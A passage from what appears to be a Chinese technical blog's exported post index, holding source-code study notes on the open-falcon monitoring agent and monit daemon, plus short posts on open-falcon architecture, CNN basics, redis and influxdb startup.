filefmt_scripts := [][]string&#123;&#125; dirfmt_scripts := []string&#123;&#125; for _, script_path := range pluginDirs &#123; //script_path could be a DIR or a SCRIPT_FILE_WITH_OR_WITHOUT_ARGS //比如： sys/ntp/60_ntp.py(arg1,arg2) 或者 sys/ntp/60_ntp.py 或者 sys/ntp //1. 参数只对单个脚本文件生效，目录不支持参数 //2. 如果某个目录下的某个脚本被单独绑定到某个机器，那么再次绑定该目录时，该文件会不会再次执行 var args string = \"\" re := regexp.MustCompile(`(.*)\\((.*)\\)`) path_args := re.FindAllStringSubmatch(script_path, -1) if path_args != nil &#123; script_path = path_args[0][1] args = path_args[0][2] &#125; abs_path := filepath.Join(g.Config().Plugin.Dir, script_path) if !file.IsExist(abs_path) &#123; continue &#125; if file.IsFile(abs_path) &#123; filefmt_scripts = append(filefmt_scripts, []string&#123;script_path, args&#125;) continue &#125; dirfmt_scripts = append(dirfmt_scripts, script_path) &#125; taken := make(map[string]struct&#123;&#125;) for _, script_file := range filefmt_scripts &#123; abs_path := filepath.Join(g.Config().Plugin.Dir, script_file[0]) _, file_name := filepath.Split(abs_path) arr := strings.Split(file_name, \"_\") var cycle int var err error cycle, err = strconv.Atoi(arr[0]) if err == nil &#123; fi, _ := os.Stat(abs_path) plugin := &amp;plugins.Plugin&#123;FilePath: script_file[0], MTime: fi.ModTime().Unix(), Cycle: cycle, Args: script_file[1]&#125; desiredAll[script_file[0]+\"(\"+script_file[1]+\")\"] = plugin &#125; //针对某个 hostgroup 绑定了单个脚本后，再绑定该脚本的目录时，会忽略目录中的该文件 taken[script_file[0]] = struct&#123;&#125;&#123;&#125; &#125; for _, script_path := range dirfmt_scripts &#123; ps := plugins.ListPlugins(strings.Trim(script_path, \"/\")) for k, p := range ps &#123; if _, ok := taken[k]; ok &#123; continue &#125; desiredAll[k] = p &#125; &#125; plugins.DelNoUsePlugins(desiredAll) plugins.AddNewPlugins(desiredAll) if g.Config().Debug &#123; log.Printf(\"current plugins:%v\\n\", plugins.Plugins) &#125; &#125;&#125; 下面需要获取监控端口和路径： 12345func SyncBuiltinMetrics() &#123; if g.Config().Heartbeat.Enabled &amp;&amp; g.Config().Heartbeat.Addr != \"\" &#123; go syncBuiltinMetrics() &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115func syncBuiltinMetrics() &#123; var timestamp int64 = -1 var checksum string = \"nil\" duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second for &#123; time.Sleep(duration) var ports = []int64&#123;&#125; var paths = []string&#123;&#125; var procs = make(map[string]map[int]string) var urls = make(map[string]string) hostname, err := g.Hostname() if err != nil &#123; continue &#125; req := model.AgentHeartbeatRequest&#123; Hostname: hostname, Checksum: checksum, &#125; var resp model.BuiltinMetricResponse // 调用rpc接口获取监控端口和路径 err = g.HbsClient.Call(\"Agent.BuiltinMetrics\", req, &amp;resp) if err != nil &#123; log.Println(\"ERROR:\", err) continue &#125; if resp.Timestamp &lt;= timestamp &#123; continue &#125; if resp.Checksum == checksum &#123; continue &#125; timestamp = resp.Timestamp checksum = resp.Checksum for _, metric := range resp.Metrics &#123; if metric.Metric == g.URL_CHECK_HEALTH &#123; arr := strings.Split(metric.Tags, \",\") if len(arr) != 2 &#123; continue &#125; url := strings.Split(arr[0], \"=\") if len(url) != 2 &#123; continue &#125; stime := strings.Split(arr[1], \"=\") if len(stime) != 2 &#123; continue &#125; if _, err := strconv.ParseInt(stime[1], 10, 64); err == nil &#123; urls[url[1]] = stime[1] &#125; else &#123; log.Println(\"metric ParseInt timeout failed:\", err) &#125; &#125; if metric.Metric == g.NET_PORT_LISTEN &#123; arr := strings.Split(metric.Tags, \"=\") if len(arr) != 2 &#123; continue &#125; if port, err := strconv.ParseInt(arr[1], 10, 64); err == nil &#123; ports = append(ports, port) &#125; else &#123; log.Println(\"metrics ParseInt failed:\", err) &#125; continue &#125; if metric.Metric == g.DU_BS &#123; arr := strings.Split(metric.Tags, \"=\") if len(arr) != 2 &#123; continue &#125; paths = append(paths, strings.TrimSpace(arr[1])) continue &#125; if metric.Metric == g.PROC_NUM &#123; arr := strings.Split(metric.Tags, \",\") tmpMap := make(map[int]string) for i := 0; i &lt; len(arr); i++ &#123; if strings.HasPrefix(arr[i], \"name=\") &#123; tmpMap[1] = strings.TrimSpace(arr[i][5:]) &#125; else if strings.HasPrefix(arr[i], \"cmdline=\") &#123; tmpMap[2] = strings.TrimSpace(arr[i][8:]) &#125; &#125; procs[metric.Tags] = tmpMap &#125; &#125; g.SetReportUrls(urls) g.SetReportPorts(ports) g.SetReportProcs(procs) g.SetDuPaths(paths) &#125;&#125; 获取信任IP列表： 123456789101112131415161718func syncTrustableIps() &#123; duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second for &#123; time.Sleep(duration) var ips string // 调用hbs接口来获取信任ip列表，用于给http接口查询认证使用/ err := g.HbsClient.Call(\"Agent.TrustableIps\", model.NullRpcRequest&#123;&#125;, &amp;ips) if err != nil &#123; log.Println(\"ERROR: call Agent.TrustableIps fail\", err) continue &#125; g.SetTrustableIps(ips) &#125;&#125; 收集指标数据collector 1234567891011121314func Collect() &#123; if !g.Config().Transfer.Enabled &#123; return &#125; if len(g.Config().Transfer.Addrs) == 0 &#123; return &#125; for _, v := range funcs.Mappers &#123; go collect(int64(v.Interval), v.Fs) &#125;&#125; 函数collect 12345678910111213141516171819202122232425262728293031323334353637383940414243444546func collect(sec int64, fns []func() []*model.MetricValue) &#123; t := time.NewTicker(time.Second * time.Duration(sec)) defer t.Stop() // 根据获取到的map的指标的数组，去抓取数据 for &#123; &lt;-t.C // hostname hostname, err := g.Hostname() if err != nil &#123; continue &#125; mvs := []*model.MetricValue&#123;&#125; // 获取忽略指标 ignoreMetrics := g.Config().IgnoreMetrics for _, fn := range fns &#123; items := fn() if items == nil &#123; continue &#125; if len(items) == 0 &#123; continue &#125; for _, mv := range items &#123; if b, ok := ignoreMetrics[mv.Metric]; ok &amp;&amp; b &#123; continue &#125; else &#123; mvs = append(mvs, mv) &#125; &#125; &#125; now := time.Now().Unix() for j := 0; j &lt; len(mvs); j++ &#123; mvs[j].Step = sec mvs[j].Endpoint = hostname mvs[j].Timestamp = now &#125; // 发送数据到transfer g.SendToTransfer(mvs) &#125;&#125; 数据发送函数SendToTransfer： 123456789101112131415161718192021222324252627282930313233343536373839404142434445func SendToTransfer(metrics []*model.MetricValue) &#123; if len(metrics) == 0 &#123; return &#125; dt := Config().DefaultTags if len(dt) &gt; 0 &#123; var buf bytes.Buffer default_tags_list := []string&#123;&#125; for k, v := range dt &#123; buf.Reset() buf.WriteString(k) buf.WriteString(\"=\") buf.WriteString(v) default_tags_list = append(default_tags_list, buf.String()) &#125; default_tags := strings.Join(default_tags_list, \",\") for i, x := range metrics &#123; buf.Reset() if x.Tags == \"\" &#123; metrics[i].Tags = default_tags &#125; else &#123; buf.WriteString(metrics[i].Tags) buf.WriteString(\",\") buf.WriteString(default_tags) metrics[i].Tags = buf.String() &#125; &#125; &#125; debug := Config().Debug if debug &#123; log.Printf(\"=&gt; &lt;Total=%d&gt; %v\\n\", len(metrics), metrics[0]) &#125; var resp model.TransferResponse // 最重要的地方，发送数据 SendMetrics(metrics, &amp;resp) if debug &#123; log.Println(\"&lt;=\", &amp;resp) &#125;&#125; 12345678910111213141516func SendMetrics(metrics []*model.MetricValue, resp *model.TransferResponse) &#123; rand.Seed(time.Now().UnixNano()) for _, i := range rand.Perm(len(Config().Transfer.Addrs)) &#123; addr := Config().Transfer.Addrs[i] // 获取transfer的客户端 c := getTransferClient(addr) if c == nil &#123; //没有就初始化一个 c = initTransferClient(addr) &#125; //抓取数据 if updateMetrics(c, metrics, resp) &#123; break &#125; &#125;&#125; 调用transfer模块的rpc接口update来更新数据： 123456789func updateMetrics(c *SingleConnRpcClient, metrics []*model.MetricValue, resp *model.TransferResponse) bool &#123; err := c.Call(\"Transfer.Update\", metrics, resp) if err != nil &#123; log.Println(\"call Transfer.Update fail:\", c, err) return false &#125; return true&#125; 最后启动http服务，启动服务之前需要初始化init函数: 1234567891011121314func init() &#123; configAdminRoutes() // 初始化admin接口路由 configCpuRoutes() // 初始化cpu接口路由 configDfRoutes() // 初始化磁盘接口路由 configHealthRoutes() // 初始化健康度路由 configIoStatRoutes() //初始化io configKernelRoutes() //初始化内核 configMemoryRoutes() //初始化memory configPageRoutes() //初始化page configPluginRoutes() //初始化插件 configPushRoutes() //初始化push, 可以使用push接口推送数据，通过这个接口转发到transfer configRunRoutes() //初始化Run configSystemRoutes() //初始化系统&#125; 启动http服务Start函数： 123456789101112131415161718func Start() &#123; if !g.Config().Http.Enabled &#123; return &#125; addr := g.Config().Http.Listen if addr == \"\" &#123; return &#125; s := &amp;http.Server&#123; Addr: addr, MaxHeaderBytes: 1 &lt;&lt; 30, &#125; log.Println(\"listening\", addr) log.Fatalln(s.ListenAndServe())&#125; 补充一点：这些接口都是开放的api，dashboard中请求的数据接口是自己实现从数据库中查询的。dashboard中接口时基于django编写了接口，然后用js来查询这些接口数据。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"redis 源码思维导图","slug":"redis源码分析思维导图","date":"2020-01-20T08:26:04.730Z","updated":"2020-01-20T08:23:35.000Z","comments":true,"path":"2020/01/20/redis源码分析思维导图/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/20/redis%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","excerpt":"","text":"redis 源码思维导图本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~ orz..","categories":[{"name":"redis","slug":"redis","permalink":"http://www.yorzorzy.xyz/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.yorzorzy.xyz/tags/redis/"}]},{"title":"open-falcon 架构","slug":"open-falcon框架学习","date":"2020-01-20T02:43:59.701Z","updated":"2020-01-20T02:43:59.701Z","comments":true,"path":"2020/01/20/open-falcon框架学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/20/open-falcon%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"open-falcon 架构open-falcon 主要架构图： 各个模块说明： agent 组件： 目前 agent 服务已经覆盖公司大部分机器，一个自动采集机器指标的自动化服务。 数据上报支持三种方式: agent 自采集基础监控上报； 用户自定义推送数据 (数据按照指定格式推送到本地 agent 端口)； 插件采集上报。 hbs 组件： 心跳服务器，定时从 DB 获取节点与主机对应关系、插件与节点绑定列表、模板、策略、全局策略等信息；将插件与节点绑定关系解析为插件与主机一一对应关系，并提供 rpc 接口方便所有 agent 查询；将 agent 上报的版本信息、插件信息写入 falcon 数据库；将模板、策略解析为策略与主机的关系对应表，与全局策略一起，以 rpc 方式提供给 judge 服务，方便其定时获取。 transfer 组件： 启动时维护两个一致性哈希列表，分别对应 graph 服务与 judge 服务，用于通过 endpoint 和 counter 计算得到的 MD5，定位每条监控数据应该存储到哪个 graph 实例和 judge 实例；提供数据转发功能，将 agent 通过 rpc 上报的监控数据，通过一致性哈希定位后，上报给相应的 graph 实例和 judge 实例；使用 rpc 接口提供 history 监控数据查询功能，用于绘图展示等。 graph 组件： 接入 rrdtool，用于监控数据持久化，通过 endpoint 和 counter 计算的 MD5 确定文件名；提供 rpc 接口，接收 transfer 上报的监控数据，并支持缓存，每个监控数据缓存半小时后再做数据持久化以减轻磁盘 IO 压力，提高整体吞吐量；提供索引缓存，每一个监控数据上报后，通过 endpoint、counter、step、timestamp 构建缓存，如果已存在则更新 timestamp，否则新建并上报至 graph 数据库；提供历史监控数据查询的 rpc 接口，便于 transfer 调用查询，查询时先通过索引缓存确认相应的 endpoint、counter 是否存在，如果存在则查询合并 rrd 文件中持久化数据与缓存数据并返回，否则直接返回。 judge 组件： 定时从 hbs 服务获取主机与策略的一一对应关系、以及全局策略，统称告警策略，用于告警判别；提供 rpc 接口，用于接收 transfer 上报的监控数据，收到每条数据时，遍历所有告警策略，如果符合告警条件，则将告警策略和监控数据存储到 redis 队列。 alarm 组件： 不停遍历 redis 队列，从中取出 judge 存储的告警策略和监控数据，写入报警数据库，然后依照告警策略中配置的告警组和获取告警成员的联系方式，和告警形成一一对应的关系，上报给 redis，方便 alarm 的下游服务进行告警发送。 aggregator 组件： 集群监控的本质是一个聚合功能。单台机器的监控指标难以反应整个集群的情况，我们需要把整个集群的机器（体现为 xbox 某个节点下的机器）综合起来看。比如所有机器的 qps 加和才是整个集群的 qps，所有机器的 request_fail 数量 ÷ 所有机器的 request_total 数量 = 整个集群的请求失败率。我们计算出集群的某个整体指标之后，也会有 “查看该指标的历史趋势图” “为该指标配置报警” 这种需求，故而，我们会把这个指标重新 push 回监控 server 端，于是，你就可以把她当成一个普通 counter 来对待了。 nodata 组件： nodata 能够和 judge 一起，监测采集项的上报异常，过程为: 配置了 nodata 的采集项超时未上报数据，nodata 生成一条非法的 mock 数据；用户在 judge 上配置相应的报警策略，收到 mock 数据就产生报警。采集项上报异常检测，作为 judge 的一个必要补充，能够使 judge 的实时报警功能更加完善、可靠。nodata 只为少数重要的采集项服务，其处理的采集项的数量，应该不多于 judge 的十分之一。滥用 nodata，将会给 falcon 的运维管理带来很多问题。通常 nodata 按照 step 从绘图中取不到打点数据时候，当然是有一定的容错 step，一般我们控制在 2 到 3 个 step。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"CNN学习笔记","slug":"CNN学习","date":"2020-01-19T12:53:29.941Z","updated":"2020-01-19T12:53:29.941Z","comments":true,"path":"2020/01/19/CNN学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/19/CNN%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"CNN学习笔记从神经网络到卷积神经网络（CNN） 卷积神经网络的层级结构 • 数据输入层/ Input layer • 卷积计算层/ CONV layer • ReLU激励层 / ReLU layer • 池化层 / Pooling layer • 全连接层 / FC layer 数据输入层该层要做的处理主要是对原始图像数据进行预处理，其中包括： 去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。 PCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化 去均值与归一化效果图： 去相关与白化效果图： 卷积计算层局部关联。每个神经元看做一个滤波器(filter) 窗口(receptive field)滑动， filter对局部数据计算 深度/depth 步长/stride （窗口一次滑动的长度） 填充值/zero-padding 参数共享机制 在卷积层中每个神经元连接数据窗的权重是固定的，每个神经元只关注一个特性。神经元就是图像处理中的滤波器，比如边缘检测专用的Sobel滤波器，即卷积层的每个滤波器都会有自己所关注一个图像特征，比如垂直边缘，水平边缘，颜色，纹理等等，这些所有神经元加起来就好比就是整张图像的特征提取器集合。 一组固定的权重和不同窗口内数据做内积: 卷积 激励层把卷积层输出结果做非线性映射。 CNN采用的激励函数一般为ReLU(The Rectified Linear Unit/修正线性单元) 激励层的实践经验：不要用sigmoid！不要用sigmoid！不要用sigmoid！首先试RELU，因为快，但要小心点如果2失效，请用Leaky ReLU或者Maxout某些情况下tanh倒是有不错的结果，但是很少 池化层池化层夹在连续的卷积层中间， 用于压缩数据和参数的量，减小过拟合。简而言之，如果输入是图像的话，那么池化层的最主要作用就是压缩图像。 特征不变性，也就是我们在图像处理中经常提到的特征的尺度不变性，池化操作就是图像的resize，平时一张狗的图像被缩小了一倍我们还能认出这是一张狗的照片，这说明这张图像中仍保留着狗最重要的特征，我们一看就能判断图像中画的是一只狗，图像压缩时去掉的信息只是一些无关紧要的信息，而留下的信息则是具有尺度不变性的特征，是最能表达图像的特征。 特征降维，我们知道一幅图像含有的信息是很大的，特征也很多，但是有些信息对于我们做图像任务时没有太多用途或者有重复，我们可以把这类冗余信息去除，把最重要的特征抽取出来，这也是池化操作的一大作用。 在一定程度上防止过拟合，更方便优化。 池化层用的方法有Max pooling 和 average pooling，而实际用的较多的是Max pooling。 Max pooling： 对于每个22的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个22窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。 全连接层 一般CNN结构依次为 1. INPUT 2. [[CONV -&gt; RELU]N -&gt; POOL?]M 3. [FC -&gt; RELU]*K 4. FC 卷积神经网络之优缺点： 优点：共享卷积核，对高维数据处理无压力无需手动选取特征，训练好权重，即得特征分类效果好缺点：需要调参，需要大样本量，训练最好要GPU物理含义不明确 总结卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://www.yorzorzy.xyz/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://www.yorzorzy.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"monit代码分析","slug":"monit学习","date":"2020-01-17T08:29:00.478Z","updated":"2020-01-17T08:29:00.478Z","comments":true,"path":"2020/01/17/monit学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/17/monit%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"monit代码分析主要流程main函数: 12345678910111213141516171819/** * The Prime mover */int main(int argc, char **argv) &#123; Bootstrap(); // Bootstrap libmonit //初始化代码 Bootstrap_setAbortHandler(vLogAbortHandler); // Abort Monit on exceptions thrown by libmonit Bootstrap_setErrorHandler(vLogError); setlocale(LC_ALL, \"C\"); prog = File_basename(argv[0]);#ifdef HAVE_OPENSSL Ssl_start();#endif init_env(); handle_options(argc, argv); do_init(); do_action(argc, argv); do_exit(false); return 0;&#125; Bootstrap函数： 12345Bootstrap:void Bootstrap(void) &#123; Exception_init(); Thread_init();&#125; Ssl_start函数，加载ssl协议 123456789101112131415161718void Ssl_start() &#123;#if (OPENSSL_VERSION_NUMBER &lt; 0x10100000L) || defined(LIBRESSL_VERSION_NUMBER) SSL_library_init(); SSL_load_error_strings(); int locks = CRYPTO_num_locks(); instanceMutexTable = CALLOC(locks, sizeof(Mutex_T)); for (int i = 0; i &lt; locks; i++) Mutex_init(instanceMutexTable[i]); CRYPTO_THREADID_set_callback(_threadID); CRYPTO_set_locking_callback(_mutexLock);#endif if (File_exist(URANDOM_DEVICE)) RAND_load_file(URANDOM_DEVICE, RANDOM_BYTES); else if (File_exist(RANDOM_DEVICE)) RAND_load_file(RANDOM_DEVICE, RANDOM_BYTES); else THROW(AssertException, \"SSL: cannot find %s nor %s on the system\", URANDOM_DEVICE, RANDOM_DEVICE);&#125; 初始化环境： 1234567891011121314151617181920212223242526272829303132333435/** * Initialize the program environment * * @see https://bitbucket.org/tildeslash/monit/commits/cd545838378517f84bdb0989cadf461a19d8ba11 */void init_env() &#123; Util_closeFds(); // Ensure that std descriptors (0, 1 and 2) are open int devnull = open(\"/dev/null\", O_RDWR); if (devnull == -1) &#123; THROW(AssertException, \"Cannot open /dev/null -- %s\", STRERROR); &#125; for (int i = 0; i &lt; 3; i++) &#123; struct stat st; if (fstat(i, &amp;st) == -1) &#123; if (dup2(devnull, i) &lt; 0) &#123; close(devnull); THROW(AssertException, \"dup2 failed -- %s\", STRERROR); &#125; &#125; &#125; close(devnull); // Get password struct with user info char buf[4096]; struct passwd pw, *result = NULL; if (getpwuid_r(geteuid(), &amp;pw, buf, sizeof(buf), &amp;result) != 0 || ! result) THROW(AssertException, \"getpwuid_r failed -- %s\", STRERROR); Run.Env.home = Str_dup(pw.pw_dir); Run.Env.user = Str_dup(pw.pw_name); // Get CWD char t[PATH_MAX]; if (! Dir_cwd(t, PATH_MAX)) THROW(AssertException, \"Monit: Cannot read current directory -- %s\", STRERROR); Run.Env.cwd = Str_dup(t);&#125; handle_options函数处理传参情况： do_init函数初始化文件和服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109/** * Initialize this application - Register signal handlers, * Parse the control file and initialize the program's * datastructures and the log system. */static void do_init() &#123; /* * Register interest for the SIGTERM signal, * in case we run in daemon mode this signal * will terminate a running daemon. */ signal(SIGTERM, do_destroy); /* * Register interest for the SIGUSER1 signal, * in case we run in daemon mode this signal * will wakeup a sleeping daemon. */ signal(SIGUSR1, do_wakeup); /* * Register interest for the SIGINT signal, * in case we run as a server but not as a daemon * we need to catch this signal if the user pressed * CTRL^C in the terminal */ signal(SIGINT, do_destroy); /* * Register interest for the SIGHUP signal, * in case we run in daemon mode this signal * will reload the configuration. */ signal(SIGHUP, do_reload); /* * Register no interest for the SIGPIPE signal, */ signal(SIGPIPE, SIG_IGN); /* * Initialize the random number generator */ srandom((unsigned)(Time_now() + getpid())); /* * Initialize the Runtime mutex. This mutex * is used to synchronize handling of global * service data */ Mutex_init(Run.mutex); /* * Initialize heartbeat mutex and condition */ Mutex_init(heartbeatMutex); Sem_init(heartbeatCond); /* * Get the position of the control file */ if (! Run.files.control) Run.files.control = file_findControlFile(); /* * Initialize the system information data collecting interface */ if (init_system_info()) Run.flags |= Run_ProcessEngineEnabled; /* * Start the Parser and create the service list. This will also set * any Runtime constants defined in the controlfile. */ if (! parse(Run.files.control)) exit(1); /* * Initialize the log system */ if (! log_init()) exit(1); /* * Did we find any service ? */ if (! servicelist) &#123; LogError(\"No service has been specified\\n\"); exit(0); &#125; /* * Initialize Runtime file variables */ file_init(); /* * Should we print debug information ? */ if (Run.debug) &#123; Util_printRunList(); Util_printServiceList(); &#125; /* * Reap any stray child processes we may have created */ atexit(waitforchildren);&#125; file_findControlFile()函数，读取配置文件，corefoundation 12345678910111213141516171819202122232425char *file_findControlFile() &#123; char *rcfile = CALLOC(sizeof(char), STRLEN + 1); snprintf(rcfile, STRLEN, \"%s/.%s\", Run.Env.home, MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; snprintf(rcfile, STRLEN, \"/etc/%s\", MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; snprintf(rcfile, STRLEN, \"%s/%s\", SYSCONFDIR, MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; snprintf(rcfile, STRLEN, \"/usr/local/etc/%s\", MONITRC); if (File_exist(rcfile)) &#123; return rcfile; &#125; if (File_exist(MONITRC)) &#123; snprintf(rcfile, STRLEN, \"%s/%s\", Run.Env.cwd, MONITRC); return rcfile; &#125; LogError(\"Cannot find the Monit control file at ~/.%s, /etc/%s, %s/%s, /usr/local/etc/%s or at ./%s \\n\", MONITRC, MONITRC, SYSCONFDIR, MONITRC, MONITRC, MONITRC); exit(1);&#125; do_action主流程: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * Dispatch to the submitted action - actions are program arguments */static void do_action(int argc, char **args) &#123; char *action = args[optind]; Run.flags |= Run_Once; if (! action) &#123; do_default(); &#125; else if (IS(action, \"start\") || IS(action, \"stop\") || IS(action, \"monitor\") || IS(action, \"unmonitor\") || IS(action, \"restart\")) &#123; char *service = args[++optind]; if (Run.mygroup || service) &#123; int errors = 0; List_T services = List_new(); if (Run.mygroup) &#123; for (ServiceGroup_T sg = servicegrouplist; sg; sg = sg-&gt;next) &#123; if (IS(Run.mygroup, sg-&gt;name)) &#123; for (list_t m = sg-&gt;members-&gt;head; m; m = m-&gt;next) &#123; Service_T s = m-&gt;e; List_append(services, s-&gt;name); &#125; break; &#125; &#125; if (List_length(services) == 0) &#123; List_free(&amp;services); LogError(\"Group '%s' not found\\n\", Run.mygroup); exit(1); &#125; &#125; else if (IS(service, \"all\")) &#123; for (Service_T s = servicelist; s; s = s-&gt;next) List_append(services, s-&gt;name); &#125; else &#123; List_append(services, service); &#125; errors = exist_daemon() ? (HttpClient_action(action, services) ? 0 : 1) : control_service_string(services, action); List_free(&amp;services); if (errors) exit(1); &#125; else &#123; LogError(\"Please specify a service name or 'all' after %s\\n\", action); exit(1); &#125; &#125; else if (IS(action, \"reload\")) &#123; LogInfo(\"Reinitializing %s daemon\\n\", prog); kill_daemon(SIGHUP); &#125; else if (IS(action, \"status\")) &#123; char *service = args[++optind]; if (! HttpClient_status(Run.mygroup, service)) exit(1); &#125; else if (IS(action, \"summary\")) &#123; char *service = args[++optind]; if (! HttpClient_summary(Run.mygroup, service)) exit(1); &#125; else if (IS(action, \"report\")) &#123; char *type = args[++optind]; if (! HttpClient_report(type)) exit(1); &#125; else if (IS(action, \"procmatch\")) &#123; char *pattern = args[++optind]; if (! pattern) &#123; printf(\"Invalid syntax - usage: procmatch \\\"&lt;pattern&gt;\\\"\\n\"); exit(1); &#125; ProcessTree_testMatch(pattern); &#125; else if (IS(action, \"quit\")) &#123; kill_daemon(SIGTERM); &#125; else if (IS(action, \"validate\")) &#123; if (do_wakeupcall()) &#123; char *service = args[++optind]; HttpClient_status(Run.mygroup, service); &#125; else &#123; _validateOnce(); &#125; exit(1); &#125; else &#123; LogError(\"Invalid argument -- %s (-h will show valid arguments)\\n\", action); exit(1); &#125;&#125; action= start stop monitor unmonitor restart 通过维护一个服务列表发送post请求给服务端来启动服务。 do_default主要启动服务的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384/** * Default action - become a daemon if defined in the Run object and * run validate() between sleeps. If not, just run validate() once. * Also, if specified, start the monit http server if in deamon mode. */static void do_default() &#123; if (Run.flags &amp; Run_Daemon) &#123; if (do_wakeupcall()) exit(0); Run.flags &amp;= ~Run_Once; if (can_http()) &#123; if (Run.httpd.flags &amp; Httpd_Net) LogInfo(\"Starting Monit %s daemon with http interface at [%s]:%d\\n\", VERSION, Run.httpd.socket.net.address ? Run.httpd.socket.net.address : \"*\", Run.httpd.socket.net.port); else if (Run.httpd.flags &amp; Httpd_Unix) LogInfo(\"Starting Monit %s daemon with http interface at %s\\n\", VERSION, Run.httpd.socket.unix.path); &#125; else &#123; LogInfo(\"Starting Monit %s daemon\\n\", VERSION); &#125; if (! (Run.flags &amp; Run_Foreground)) daemonize(); if (! file_createPidFile(Run.files.pid)) &#123; LogError(\"Monit daemon died\\n\"); exit(1); &#125; if (! State_open()) exit(1); State_restore(); atexit(file_finalize); if (Run.startdelay &amp;&amp; State_reboot()) &#123; time_t now = Time_now(); time_t delay = now + Run.startdelay; LogInfo(\"Monit will delay for %ds on first start after reboot ...\\n\", Run.startdelay); /* sleep can be interrupted by signal =&gt; make sure we paused long enough */ while (now &lt; delay) &#123; sleep((unsigned int)(delay - now)); if (Run.flags &amp; Run_Stopped) do_exit(false); now = Time_now(); &#125; &#125; if (can_http()) monit_http(Httpd_Start); /* send the monit startup notification */ Event_post(Run.system, Event_Instance, State_Changed, Run.system-&gt;action_MONIT_START, \"Monit %s started\", VERSION); if (Run.mmonits) &#123; Thread_create(heartbeatThread, heartbeat, NULL); heartbeatRunning = true; &#125; while (true) &#123; validate(); /* In the case that there is no pending action then sleep */ if (! (Run.flags &amp; Run_ActionPending) &amp;&amp; ! interrupt()) sleep(Run.polltime); if (Run.flags &amp; Run_DoWakeup) &#123; Run.flags &amp;= ~Run_DoWakeup; LogInfo(\"Awakened by User defined signal 1\\n\"); &#125; if (Run.flags &amp; Run_Stopped) &#123; do_exit(true); &#125; else if (Run.flags &amp; Run_DoReload) &#123; do_reinit(); &#125; else &#123; State_saveIfDirty(); &#125; &#125; &#125; else &#123; _validateOnce(); &#125;&#125; do_wakeupcall调用函数是否需要唤醒进程。 can_http()判断是否可以启动http. daemonize()函数： 12345678910111213141516171819202122232425262728293031323334/** * Transform a program into a daemon. Inspired by code from Stephen * A. Rago's book, Unix System V Network Programming. */void daemonize() &#123; pid_t pid; /* * Become a session leader to lose our controlling terminal */ if ((pid = fork ()) &lt; 0) &#123; LogError(\"Cannot fork a new process\\n\"); exit (1); &#125; else if (pid != 0) &#123; _exit(0); &#125; setsid(); if ((pid = fork ()) &lt; 0) &#123; LogError(\"Cannot fork a new process\\n\"); exit (1); &#125; else if (pid != 0) &#123; _exit(0); &#125; /* * Change current directory to the root so that other file systems can be unmounted while we're running */ if (chdir(\"/\") &lt; 0) &#123; LogError(\"Cannot chdir to / -- %s\\n\", STRERROR); exit(1); &#125; /* * Attach standard descriptors to /dev/null. Other descriptors should be closed in env.c */ Util_redirectStdFds();&#125; file_createPidFile场景pid文件。 服务数据结构，所有的服务数据结构都在monit.h文件中 yacc flex解析 使用flex词法解析器，yacc语法解析器。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"influxdb","slug":"influxdb1","date":"2020-01-17T08:25:39.621Z","updated":"2020-01-17T08:25:39.621Z","comments":true,"path":"2020/01/17/influxdb1/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/17/influxdb1/","excerpt":"","text":"influxdb 启动流程学习笔记流程分析本文基于influxdb 1.4来进行分析代码 influxdb入口文件在 /cmd/influxd/main.go文件中 1234567891011// 主函数func main() &#123; rand.Seed(time.Now().UnixNano()) 